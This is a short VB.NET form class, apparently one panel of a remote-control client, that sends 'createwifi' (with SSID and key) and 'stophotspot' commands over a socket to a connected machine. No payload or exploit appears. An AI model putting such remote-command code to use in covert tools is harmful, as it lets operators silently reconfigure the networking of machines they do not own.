Public Class hotspot
    Public sock As Integer
    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        If ssid.Text = vbNullString Then
            MsgBox("SSID Cannot be empty")
        Else
            If key.Text.Length >= 8 Then
                Main.S.Send(sock, "createwifi" & Main.Yy & ssid.Text & Main.Yy & key.Text)
            Else
                MsgBox("Password at least 8 charachters")
            End If
        End If

    End Sub

    Private Sub SkyDarkButton2_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton2.Click
        Main.S.Send(sock, "stophotspot")
    End Sub
End Class